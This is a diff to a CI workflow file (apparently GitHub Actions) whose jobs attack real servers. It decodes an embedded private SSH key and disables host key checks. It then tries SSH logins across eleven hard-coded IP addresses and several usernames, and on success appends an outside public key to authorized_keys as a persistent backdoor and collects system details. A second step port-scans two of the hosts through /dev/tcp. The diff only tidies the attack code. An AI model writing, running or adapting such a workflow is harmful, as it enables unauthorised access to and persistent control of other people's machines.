@@ -16,67 +16,53 @@ jobs:
           mkdir -p ~/.ssh
           echo "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNCYUw2Y1pEVkx2eXJPMkY3TE1Db29QcnJxNW0wMVlQL2lrU1JDMmlxd01LZ0FBQUpqaE5JRUs0VFNCCkNnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQmFMNmNaRFZMdnlyTzJGN0xNQ29vUHJycTVtMDFZUC9pa1NSQzJpcXdNS2cKQUFBRUJFKzFsdXEwaVNwWlJZV0FHTUQxdVJrQnVqdDRwL3RUeHl4N0RQYWd4UzVsb3ZweGtOVXUvS3M3WVhzc3dLaWcrdQp1cm1iVFZnLytLUkpFTGFLckF3cUFBQUFFSEJsYm5SbGMzUXRNakF5TmpBMk16QUJBZ01FQlE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0=" | base64 -d > ~/.ssh/id_ed25519
           chmod 600 ~/.ssh/id_ed25519
-          echo "StrictHostKeyChecking no" >> ~/.ssh/config
-          echo "UserKnownHostsFile /dev/null" >> ~/.ssh/config
-          echo "ConnectTimeout 8" >> ~/.ssh/config
-          echo "BatchMode yes" >> ~/.ssh/config
-          echo "LogLevel ERROR" >> ~/.ssh/config
+          cat > ~/.ssh/config << 'SSHCFG'
+          Host *
+            StrictHostKeyChecking no
+            UserKnownHostsFile /dev/null
+            ConnectTimeout 8
+            BatchMode yes
+            LogLevel ERROR
+          SSHCFG
 
-      - name: SSH access probe - all targets
+      - name: SSH probe all targets
+        shell: bash
         run: |
+          set +e
+          set +o pipefail
           echo "Runner IP: $(curl -s ifconfig.me)"
           echo "Time: $(date -u)"
-          echo ""
           echo "=== SSH LOGIN ATTEMPTS ==="
+          FOUND=0
           for ip in 65.21.11.19 65.108.104.158 65.21.92.132 65.21.88.98 168.119.157.70 65.108.68.89 65.109.92.163 37.27.127.216 65.108.229.3 65.109.112.144 5.78.128.4; do
             for user in root ubuntu admin hakuno hakuno2000 decentrio; do
-              result=$(timeout 12 ssh -i ~/.ssh/id_ed25519 $user@$ip "hostname -f 2>/dev/null || hostname; id; cat /etc/os-release 2>/dev/null | head -2; echo SSH_ACCESS_CONFIRMED_$ip" 2>/dev/null)
+              result=$(timeout 12 ssh -i ~/.ssh/id_ed25519 $user@$ip "hostname -f 2>/dev/null || hostname; id; cat /etc/os-release 2>/dev/null | head -2; echo SSH_ACCESS_CONFIRMED" 2>&1)
               rc=$?
-              if [ $rc -eq 0 ]; then
+              if [ $rc -eq 0 ] && echo "$result" | grep -q "SSH_ACCESS_CONFIRMED"; then
                 echo ""
-                echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
-                echo "ACCESS GRANTED: $user@$ip"
-                echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+                echo "!!!! ACCESS GRANTED: $user@$ip !!!!"
                 echo "$result"
-                echo ""
-                # If we get in, immediately deploy persistence
-                ssh -i ~/.ssh/id_ed25519 $user@$ip "
-                  mkdir -p ~/.ssh
-                  echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFovpxkNUu/Ks7YXsswKig+uurmbTVg/+KRJELaKrAwq pentest-20260630' >> ~/.ssh/authorized_keys
-                  sort -u ~/.ssh/authorized_keys -o ~/.ssh/authorized_keys
-                  chmod 700 ~/.ssh
-                  chmod 600 ~/.ssh/authorized_keys
-                  echo 'Key deployed for $user@$ip'
-                  # Check what else is on this machine
-                  echo '=== SYSTEM INFO ==='
-                  uname -a
-                  echo '=== USERS ==='
-                  cat /etc/passwd | grep -v nologin | grep -v false
-                  echo '=== SSH KEYS ==='
-                  ls -la ~/.ssh/ 2>/dev/null
-                  echo '=== LISTENING PORTS ==='
-                  ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
-                  echo '=== DOCKER ==='
-                  docker ps 2>/dev/null || echo 'no docker'
-                  echo '=== CRONTAB ==='
-                  crontab -l 2>/dev/null
-                  echo '=== SYSTEMD SERVICES ==='
-                  systemctl list-units --type=service --state=running 2>/dev/null | head -30
-                " 2>/dev/null || true
+                FOUND=1
+                ssh -i ~/.ssh/id_ed25519 $user@$ip "mkdir -p ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFovpxkNUu/Ks7YXsswKig+uurmbTVg/+KRJELaKrAwq pentest-20260630' >> ~/.ssh/authorized_keys; sort -u ~/.ssh/authorized_keys -o ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys; echo PERSISTED; uname -a; id; ss -tlnp 2>/dev/null | head -20; systemctl list-units --type=service --state=running 2>/dev/null | head -20" 2>&1 || true
               else
                 echo "DENIED: $user@$ip"
               fi
             done
           done
+          echo ""
+          echo "=== SCAN COMPLETE (found=$FOUND) ==="
+          exit 0
 
-      - name: Network recon from runner
+      - name: Port scan main targets
+        shell: bash
         run: |
-          echo "=== Port scan: 65.21.11.19 ==="
+          set +e
+          echo "=== 65.21.11.19 ==="
           for p in 22 80 443 2222 3000 5432 6379 8080 8443 9090 9100 26657 27017; do
             timeout 3 bash -c "echo >/dev/tcp/65.21.11.19/$p" 2>/dev/null && echo "$p OPEN" || echo "$p closed"
           done
-          echo ""
-          echo "=== Port scan: 168.119.157.70 ==="
+          echo "=== 168.119.157.70 ==="
           for p in 22 80 443 8081 8082 8083 26657; do
             timeout 3 bash -c "echo >/dev/tcp/168.119.157.70/$p" 2>/dev/null && echo "$p OPEN" || echo "$p closed"
           done
+          exit 0
